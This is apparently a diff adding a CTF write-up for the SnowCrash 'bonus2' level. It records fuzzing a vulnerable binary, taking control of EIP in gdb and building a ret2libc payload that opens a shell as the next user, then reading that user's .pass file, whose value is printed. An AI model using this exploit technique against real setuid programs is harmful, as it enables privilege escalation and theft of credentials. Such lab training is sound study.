@@ -1,0 +1,115 @@
+# Here comes the fuzzing part !
+
+# LANG=fi
+bonus2@SnowCrash:~$ env LANG="fi" ./bonus2 $(python -c 'print "A"*560') $(python -c 'print "A"*14')
+Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Segmentation fault (core dumped)
+bonus2@SnowCrash:~$ env LANG="fi" ./bonus2 $(python -c 'print "A"*560') $(python -c 'print "A"*13')
+Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+# LANG=nl
+bonus2@SnowCrash:~$ env LANG="nl" ./bonus2 $(python -c 'print "A"*560') $(python -c 'print "A"*19')
+Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Segmentation fault (core dumped)
+bonus2@SnowCrash:~$ env LANG="nl" ./bonus2 $(python -c 'print "A"*560') $(python -c 'print "A"*18')
+Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+# LANG="" (EN)
+bonus2@SnowCrash:~$ env LANG="" ./bonus2 $(python -c 'print "A"*560') $(python -c 'print "A"*26')
+Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Segmentation fault (core dumped)
+bonus2@SnowCrash:~$ env LANG="" ./bonus2 $(python -c 'print "A"*560') $(python -c 'print "A"*25')
+Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+# Yep, it segfaults for each languages
+
+bonus2@SnowCrash:~$ env LANG="nl" gdb ./bonus2
+
+(gdb) r $(python -c 'print "B"*560') $(python -c 'print "A"*19')
+Starting program: /home/user/bonus2/bonus2 $(python -c 'print "B"*560') $(python -c 'print "A"*19')
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+
+# Oh well, it jumps to the address of the first arg :)
+# Let's try to find where
+[...] AFK TRYING [...]
+
+Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A"*10+"B"*10+"C"*58') $(python -c 'print "\x90"*19')
+Program received signal SIGSEGV, Segmentation fault.
+0x90909043 in ?? ()
+
+[...] [...]
+Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A"*7+"\xff\xff\xff\xff"+"B"*9+"C"*20') $(python -c 'print "\x90"*19')
+Program received signal SIGSEGV, Segmentation fault.
+0xffffffff in ?? ()
+
+# Nice we can get control over EIP :) Now this will be an easy ret2libc :)
+
+(gdb) info func system
+0xb7e6b060  system
+(gdb) find &system,+9999999,"/bin/sh"
+0xb7f8cc58
+
+(gdb) r $(python -c 'print "A"*7+"\x60\xb0\xe6\xb7"+"\x58\xcc\xf8\xb7"+"\x58\xcc\xf8\xb7"+"B"*1+"C"*20') $(python -c 'print "\x90"*19')
+$ ls
+bonus2
+
+# Well the exploit is working in GDB but not IRL ???
+
+# From a website (refs.txt):
+  Most of the times exploits fails due to environment variables.
+  In the techniques like ret2libc, we are dependent on the environment variables to get the argument
+
+# Well i had to set the same env in gdb and in my machine for my exploit to work
+
+# Machine side:
+bonus2@SnowCrash:~$ env -i bash
+bonus2@SnowCrash:/home/user/bonus2$ export LANG="nl"
+bonus2@SnowCrash:/home/user/bonus2$ env
+LS_COLORS=
+PWD=/home/user/bonus2
+LANG=nl
+SHLVL=1
+LESSOPEN=| /usr/bin/lesspipe %s
+LESSCLOSE=/usr/bin/lesspipe %s %s
+_=/usr/bin/env
+
+# GDB side:
+env - /usr/bin/gdb ./bonus2
+(gdb) show env
+LINES=34
+COLUMNS=77
+(gdb) unset env LINES
+(gdb) unset env COLUMNS
+
+(gdb) set env LS_COLOR
+(gdb) set env PWD=/home/user/bonus2
+(gdb) set env LANG="nl"
+(gdb) set env SHLVL=1 LESSOPEN='| /usr/bin/lesspipe %s'
+(gdb) set env SHLVL=1
+(gdb) set env LESSOPEN=| /usr/bin/lesspipe %s
+(gdb) set env LESSCLOSE=/usr/bin/lesspipe %s %s
+(gdb) set env _=/usr/bin/env
+
+(gdb) show env
+LS_COLOR=
+PWD=/home/user/bonus2
+LANG=nl
+SHLVL=1
+LESSOPEN=| /usr/bin/lesspipe %s
+LESSCLOSE=/usr/bin/lesspipe %s %s
+_=/usr/bin/env
+
+# Now that both env are the same, i have to rewrite my shellcode
+
+[...] AFK TRYING [...]
+Starting program: /home/user/bonus2/bonus2 $(python -c 'print "B"*4+"\xff\xff\xff\xff"+"A"*45') $(python -c 'print "\x90"*19')
+Program received signal SIGSEGV, Segmentation fault.
+0xffffffff in ?? ()
+
+# Now that i found again how to gain control over EIP, i can put my shellcolde:
+/home/user/bonus2/bonus2 $(/usr/bin/python -c 'print "B"*4+"\x60\xb0\xe6\xb7"+"\x58\xcc\xf8\xb7"+"\x58\xcc\xf8\xb7"+"A"*37') $(/usr/bin/python -c 'print "\x90"*19')
+$ whoami
+bonus3
+$ /bin/cat /home/user/bonus3/.pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
